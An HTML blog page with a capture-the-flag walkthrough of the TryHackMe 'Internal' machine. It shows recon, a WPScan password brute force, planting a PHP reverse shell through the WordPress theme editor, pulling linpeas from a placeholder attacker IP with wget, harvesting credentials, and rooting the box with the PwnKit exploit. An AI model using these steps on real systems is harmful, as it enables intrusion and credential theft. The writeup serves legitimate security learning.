@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head><title>THM Writeup | Internal (Hard) &ndash; tox@box</title>
+<meta name="description" content="A driven 16 y/o [infosec](https://tryhackme.com/p/toxic.sec) student always looking for new opportunities to learn and grow :&gt;.">
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8"/>
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin="anonymous" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />
+
+
+<link rel="stylesheet" href="https://pwnedbytoxic.github.io/css/palettes/base16-dark.css">
+<link rel="stylesheet" href="https://pwnedbytoxic.github.io/css/risotto.css">
+<link rel="stylesheet" href="https://pwnedbytoxic.github.io/css/custom.css">
+
+
+<link rel="icon" href="https://pwnedbytoxic.github.io/favicon.ico">
+
+
+
+
+</head>
+
+    <body>
+        <div class="page">
+
+            <header class="page__header"><nav class="page__nav main-nav">
+    <ul>
+    <h1 class="page__logo"><a href="https://pwnedbytoxic.github.io/" class="page__logo-inner">tox@box</a></h1>
+    
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="https://pwnedbytoxic.github.io/about/" title="">About</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item active" href="https://pwnedbytoxic.github.io/posts/" title="Posts">Posts</a></li>
+    
+    </ul>
+</nav>
+
+</header>
+
+            <section class="page__body">
+    <header class="content__header">
+        <h1>THM Writeup | Internal (Hard)</h1>
+    </header>
+    
+    <div class="content__body">
+        <h2 id="introductionoverview">Introduction/Overview</h2>
+<hr>
+<ul>
+<li><strong>Challenge Name:</strong> TryHackMe</li>
+<li><strong>Category:</strong> Penetration Testing Challenge</li>
+<li><strong>Points:</strong> 60</li>
+<li><strong>Author:</strong> TheMayor</li>
+<li><strong>Description:</strong> Complex Linux &amp; Docker exploitation without the usage of metasploit (usage of CVE-2021-4034).</li>
+</ul>
+<h2 id="scanningrecon">Scanning/Recon</h2>
+<ul>
+<li><strong>IP Address:</strong> 10.10.174.253</li>
+</ul>
+<p>Inital scan with <code>nmap -p- 10.10.174.253</code> and later <code>nmap -A -p 22,80</code>, resulting in</p>
+<pre tabindex="0"><code>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6efaefbef65f98b9597bf78eb9c5621e (RSA)
+|   256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA)
+|_  256 b07f7f7b5262622a60d43d36fa89eeff (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+</code></pre><p>A default apache web server &amp; ssh service are found on the machine. Naturally, I take to gobuster with this info, after adding <code>10.10.174.253</code> to my <code>/etc/hosts</code> as internal.thm &ndash;</p>
+<pre tabindex="0"><code>===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://internal.thm/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/08/02 23:38:25 Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd            (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/blog                 (Status: 301) [Size: 311] [--&gt; http://internal.thm/blog/]
+/javascript           (Status: 301) [Size: 317] [--&gt; http://internal.thm/javascript/]
+/phpmyadmin           (Status: 301) [Size: 317] [--&gt; http://internal.thm/phpmyadmin/]
+/server-status        (Status: 403) [Size: 277]
+/wordpress            (Status: 301) [Size: 316] [--&gt; http://internal.thm/wordpress/]
+Progress: 20469 / 20470 (100.00%)
+</code></pre><p>With the location of <code>/blog</code>, we find a cheeky little wordpress site hosting some sort of content.</p>
+<p>I tried to use the open-source tool WPScan for this section of enumeration, though found more info through actually traversing the site, which I believe the creator intended for this challange.</p>
+<p>&ndash;</p>
+<p>After looking through the site, we notice a user called admin that seems to own the blog. Using Wappalyzer (or CTRL-U), we can also see that our version of wordpress is 5.4.2.</p>
+<p>Unfortunately, <code>searchsploit wordpress 5.4.2</code> brings back nothing.</p>
+<p>After taking a look at the login feature at <code>/blog/wp-login.php</code>, we notice that default wordpress creds do not work (admin:password, admin:admin)</p>
+<p>At this point, after looking over my notes a couple times, I decided I had little other choice but to be obnoxious &amp; bruteforce :/</p>
+<h2 id="exploitation">Exploitation</h2>
+<ul>
+<li><strong>Exploitation Method:</strong> Bruteforce :c</li>
+</ul>
+<p>Using the WPScan tool from before (or Hydra), we can bruteforce the login feature with <code>wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt</code>. This will gain us our first credentials &amp; hopefully gain us our beloved webshell.</p>
+<pre tabindex="0"><code>[!] Valid Combinations Found:
+ | Username: admin, Password: ------
+</code></pre><p>Using the tutorial at <a href="https://vk9-sec.com/reverse-shell-on-any-cms/">VK9</a>, we can gain a reverse shell using  &ldquo;theme editor&rdquo; under &ldquo;appearance&rdquo; and replacing the code inside <code>index.php</code> with <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">php-reverse-shell.php</a> after customizing <code>$ip</code> and <code>$port</code> to our own ip and desired listening port. We then crack open that port using <code>nc -nvlp PORT_NUMBER</code> and behold our own shell on an internal server.</p>
+<p>With this step finished, we can move around the machine and get to know the target we are attacking.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<ul>
+<li><strong>Initial User:</strong> www-data</li>
+<li><strong>Privilege Escalation Method:</strong> pwnkit (CVE-2021-4034)</li>
+</ul>
+<p>The first thing to catch the eye is a local user, aubreanna, who does not allow us as www-data to cd into her ~. <code>sudo -l</code> also brings us nowhere as www-data has very few permissions on this box (makes sense, its supposed to be hard).</p>
+<p>After installing <a href="https://linpeas.sh/">linpeas.sh</a> on the box by hosting a <code>python -m http.server</code> locally and fetching it on the box using <code>wget http://MY_IP:8000/linpeas.sh</code> in <code>/tmp</code>, we find database credentials after <code>cd /etc/phpmyadmin</code> and <code>cat config-db.php | grep '$'</code></p>
+<p>Unfortunately, after logging into the phpmyadmin database &amp; searching for 30 minutes, I realized that its just a big rabbit hole with no PE vectors :c</p>
+<p>Another interesting file we find, however, is <code>/opt/wp-save.txt</code>, which is a HUGE hint containing credentials presented as a sort of note from aubreanna to herself. We can now <code>su aubreanna</code> with these creds after stabilizing our shell with <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>
+<p>Just like that, we can <code>cat ~/user.txt</code> and submit to TryHackMe.</p>
+<p>Also in ~, we find <code>Jenkins.txt</code>, which reveals an internal service that can be accessed with SSH. Instead of doing this, however, we are going to take the pwnkit route and get the box done quicker.</p>
+<p>We can downlaod the pwnkit binary onto our own system thanks to <a href="https://github.com/ly4k/PwnKit">ly4k</a> and upload the binary to our box for exploitation purposes.</p>
+<p>First, we run <code>curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o pwnkit</code> locally to create the pwnkit binary, then use the same <code>python -m http.server</code> method to install pwnkit to <code>/tmp</code>, give ourselves permissions with <code>chmod +x ./PwnKit</code>, and finally <code>./pwnkit</code> for our root shell (directly curling from github doesn&rsquo;t work on THM servers ig).</p>
+<p>And just like that &ndash; we rooted the box!</p>
+<pre tabindex="0"><code>HTTP request sent, awaiting response... 200 OK
+Length: 18040 (18K) [application/octet-stream]
+Saving to: 'PwnKit'
+
+PwnKit              100%[===================&gt;]  17.62K  --.-KB/s    in 0.1s    
+
+2023-10-13 04:31:01 (142 KB/s) - 'PwnKit' saved [18040/18040]
+
+www-data@internal:/tmp$ ls
+ls
+PwnKit
+www-data@internal:/tmp$ chmod 777 PwnKit
+chmod 777 PwnKit
+www-data@internal:/tmp$ ./PwnKit
+./PwnKit
+root@internal:/tmp# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+root@internal:/tmp#
+</code></pre><h2 id="conclusion">Conclusion</h2>
+<p>This box was a lot of fun so kudos to TheMayor for creating it! This is the first writeup for a box I have actually created and had the courage to post online, so enjoy the writeup &amp; new blog.</p>
+<ul>
+<li><strong>Lessons Learned:</strong>  We learned how to gain a webshell from gaining webmaster authority on a CMS (Wordpress) as well as the process of uploading files between a local box and a remote system with wget &amp; curl. We were also familiarized with standard tools such as nmap and WPScan as well as the imfamous CVE-2021-4034.</li>
+</ul>
+<p>Work smart, not hard!</p>
+<hr>
+<p>Happy Hacking!!!</p>
+
+    </div>
+    <footer class="content__footer"></footer>
+
+            </section>
+
+            <section class="page__aside">
+                <div class="aside__about">
+<div class="aside__about">
+    <img class="about__logo" src="https://pwnedbytoxic.github.io/images/rice.svg" alt="Logo">
+<h1 class="about__title">pwnedbytoxic</h1>
+<p class="about__description">A driven 16 y/o <a href="https://tryhackme.com/p/toxic.sec">infosec</a> student always looking for new opportunities to learn and grow :&gt;.</p>
+</div>
+
+
+<ul class="aside__social-links">
+    
+    <li>
+        <a href="https://github.com/pwnedbytoxic" rel="me" aria-label="GitHub" title="GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="mailto:hoody.damon@gmail.com" rel="me" aria-label="Email" title="Email"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://tryhackme.com/p/toxic.sec" rel="me" aria-label="TryHackMe" title="TryHackMe"><i class="fa fa-flag" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+</ul>
+</div>
+                <hr>
+                <div class="aside__content">
+    
+    
+        <p>
+            
+            2023-10-12
+        </p>
+    
+
+    
+
+                </div>
+            </section>
+
+            <footer class="page__footer"><p>
+    
+    
+    
+    
+    
+    
+      
+    
+      
+    
+    
+    
+</p>
+<br /><br />
+<p class="copyright"></p>
+<p class="advertisement">// made by toxic //</p>
+</footer>
+
+        </div>
+    </body>
+
+</html>
